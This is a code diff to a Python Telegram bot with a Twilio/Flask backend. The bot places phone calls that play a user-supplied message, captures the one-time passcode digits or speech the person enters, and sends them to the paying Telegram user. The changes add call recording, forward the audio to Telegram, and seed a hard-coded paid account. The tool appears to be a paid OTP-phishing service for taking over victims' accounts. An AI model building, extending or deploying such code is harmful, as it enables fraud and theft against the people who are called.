@@ -60,8 +60,7 @@ def load_paid_users():
         log.info("Loaded paid users from JSON")
     except FileNotFoundError:
         log.warning("paid_users.json not found. Starting with default seeded user.")
-        # Seeded user
-        paid_users = {}
+        paid_users = {6910149689: datetime.now(timezone.utc) + timedelta(days=4)}
         save_paid_users()
 
 def save_paid_users():
@@ -132,7 +131,7 @@ async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 "1. Tap *📱 Set Phone* to save your number.\n"
                 "2. Tap *📞 Make Call* and enter your custom message.\n"
                 "3. The bot will call you and capture the OTP.\n"
-                "4. You’ll get the OTP back in this chat ✅"
+                "4. Receive OTP text and voice recording directly in Telegram ✅"
             ),
             parse_mode="Markdown",
             reply_markup=get_main_keyboard(update.effective_user.id)
@@ -211,7 +210,8 @@ async def text_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             url=f"{base}/voice?msg={quote(text)}",
             status_callback=f"{base}/call_status",
             status_callback_event=['initiated', 'ringing', 'answered', 'completed', 'no-answer'],
-            status_callback_method='POST'
+            status_callback_method='POST',
+            record=True  # <<< enable call recording
         )
         await update.message.reply_text(f"📞 Calling {phone} now with your message...")
         return
@@ -234,7 +234,8 @@ async def text_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             url=f"{base}/voice?msg={quote(last_message[uid])}",
             status_callback=f"{base}/call_status",
             status_callback_event=['initiated', 'ringing', 'answered', 'completed', 'no-answer'],
-            status_callback_method='POST'
+            status_callback_method='POST',
+            record=True
         )
         await update.message.reply_text(f"📞 Re-calling {phone} with your last message...")
 
@@ -282,26 +283,33 @@ def voice():
 def capture():
     otp = request.values.get("Digits") or request.values.get("SpeechResult")
     to_number = request.values.get("To")
-    log.info("Twilio /capture To=%s OTP=%s", to_number, otp)
+    recording_url = request.values.get("RecordingUrl")  # Twilio recording
+    chat_id = phone_to_chat.get(to_number)
+    log.info("Twilio /capture To=%s OTP=%s Recording=%s", to_number, otp, recording_url)
 
-    if to_number and otp:
-        captured_otp[to_number] = otp
-        chat_id = phone_to_chat.get(to_number)
-        if chat_id:
-            try:
+    if chat_id:
+        try:
+            if otp:
                 fut = asyncio.run_coroutine_threadsafe(
                     application.bot.send_message(chat_id=chat_id, text=f"📩 Captured OTP: {otp}"),
                     bot_loop
                 )
                 fut.result(timeout=5)
-                # Show menu after call
+
+            if recording_url:
                 fut = asyncio.run_coroutine_threadsafe(
-                    application.bot.send_message(chat_id=chat_id, text="Main Menu:", reply_markup=get_main_keyboard(uid)),
+                    application.bot.send_voice(chat_id=chat_id, voice=recording_url+".mp3"),
                     bot_loop
                 )
                 fut.result(timeout=5)
-            except Exception:
-                log.exception("Failed to send OTP to Telegram")
+
+            fut = asyncio.run_coroutine_threadsafe(
+                application.bot.send_message(chat_id=chat_id, text="Main Menu:", reply_markup=get_main_keyboard(uid)),
+                bot_loop
+            )
+            fut.result(timeout=5)
+        except Exception:
+            log.exception("Failed to send OTP or recording to Telegram")
 
     resp = VoiceResponse()
     resp.say("Thanks! Your OTP has been captured. Goodbye!")
@@ -375,7 +383,6 @@ def bot_loop_thread():
     log.info("Bot loop running.")
     bot_loop.run_forever()
 
-# Start bot loop
 bot_loop = None
 t = threading.Thread(target=bot_loop_thread, name="bot-loop", daemon=True)
 t.start()
@@ -386,4 +393,3 @@ t.start()
 if __name__ == "__main__":
     log.info("Starting Flask on port %s", PORT)
     flask_app.run(host="0.0.0.0", port=PORT)
-
